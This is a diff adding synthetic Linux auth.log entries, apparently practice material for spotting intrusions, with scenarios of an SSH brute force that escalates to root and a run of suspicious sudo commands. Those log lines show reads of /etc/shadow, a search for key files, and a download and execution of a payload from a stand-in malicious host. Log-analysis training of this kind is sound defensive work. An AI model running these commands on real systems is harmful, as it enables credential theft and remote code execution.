@@ -1,1 +1,38 @@
-
+======================================
+Part 2: Linux Authentication Logs
+======================================
+--------------------------------------------------------------------------
+Scenario 4: SSH Brute Force Attack (/var/log/auth.log)
+--------------------------------------------------------------------------
+Aug 21 18:45:12 webserver01 sshd[15234]: Failed password for root from 198.51.100.25 port 22334 ssh2
+Aug 21 18:45:14 webserver01 sshd[15236]: Failed password for admin from 198.51.100.25 port 22335 ssh2
+Aug 21 18:45:16 webserver01 sshd[15238]: Failed password for administrator from 198.51.100.25 port 22336 ssh2
+Aug 21 18:45:18 webserver01 sshd[15240]: Failed password for user from 198.51.100.25 port 22337 ssh2
+Aug 21 18:45:20 webserver01 sshd[15242]: Failed password for test from 198.51.100.25 port 22338 ssh2
+Aug 21 18:45:22 webserver01 sshd[15244]: Failed password for guest from 198.51.100.25 port 22339 ssh2
+Aug 21 18:45:24 webserver01 sshd[15246]: Failed password for oracle from 198.51.100.25 port 22340 ssh2
+Aug 21 18:45:26 webserver01 sshd[15248]: Failed password for mysql from 198.51.100.25 port 22341 ssh2
+Aug 21 18:45:28 webserver01 sshd[15250]: Failed password for postgres from 198.51.100.25 port 22342 ssh2
+Aug 21 18:45:30 webserver01 sshd[15252]: Failed password for nginx from 198.51.100.25 port 22343 ssh2
+Aug 21 18:45:32 webserver01 sshd[15254]: Failed password for apache from 198.51.100.25 port 22344 ssh2
+Aug 21 18:45:34 webserver01 sshd[15256]: Failed password for www from 198.51.100.25 port 22345 ssh2
+Aug 21 18:45:36 webserver01 sshd[15258]: Failed password for ftp from 198.51.100.25 port 22346 ssh2
+Aug 21 18:45:38 webserver01 sshd[15260]: Failed password for mail from 198.51.100.25 port 22347 ssh2
+Aug 21 18:45:40 webserver01 sshd[15262]: Failed password for support from 198.51.100.25 port 22348 ssh2
+Aug 21 18:47:15 webserver01 sshd[15264]: Accepted password for backup from 198.51.100.25 port 22349 ssh2
+Aug 21 18:47:15 webserver01 sshd[15264]: pam_unix(sshd:session): session opened for user backup by (uid=0)
+Aug 21 18:47:16 webserver01 sudo: backup : TTY=pts/0 ; PWD=/home/backup ; USER=root ; COMMAND=/bin/bash
+Aug 21 18:47:16 webserver01 sudo: pam_unix(sudo:session): session opened for user root by backup(uid=1005)
+--------------------------------------------------------------------------
+Scenario 5: Suspicious Command Execution
+--------------------------------------------------------------------------
+Aug 21 19:15:22 webserver01 sudo: backup : TTY=pts/0 ; PWD=/home/backup ; USER=root ; COMMAND=/bin/cat /etc/shadow
+Aug 21 19:15:25 webserver01 sudo: backup : TTY=pts/0 ; PWD=/home/backup ; USER=root ; COMMAND=/bin/cat /etc/passwd
+Aug 21 19:15:28 webserver01 sudo: backup : TTY=pts/0 ; PWD=/home/backup ; USER=root ; COMMAND=/usr/bin/find / -name "*.key" -type f
+Aug 21 19:15:35 webserver01 sudo: backup : TTY=pts/0 ; PWD=/home/backup ; USER=root ; COMMAND=/bin/netstat -tulpn
+Aug 21 19:15:40 webserver01 sudo: backup : TTY=pts/0 ; PWD=/home/backup ; USER=root ; COMMAND=/bin/ps auxf
+Aug 21 19:16:12 webserver01 sudo: backup : TTY=pts/0 ; PWD=/home/backup ; USER=root ; COMMAND=/usr/bin/crontab -l
+Aug 21 19:16:18 webserver01 sudo: backup : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/wget http://malicious.example.com/payload.sh
+Aug 21 19:16:22 webserver01 sudo: backup : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/chmod +x payload.sh
+Aug 21 19:16:25 webserver01 sudo: backup : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/tmp/payload.sh
+--------------------------------------------------------------------------
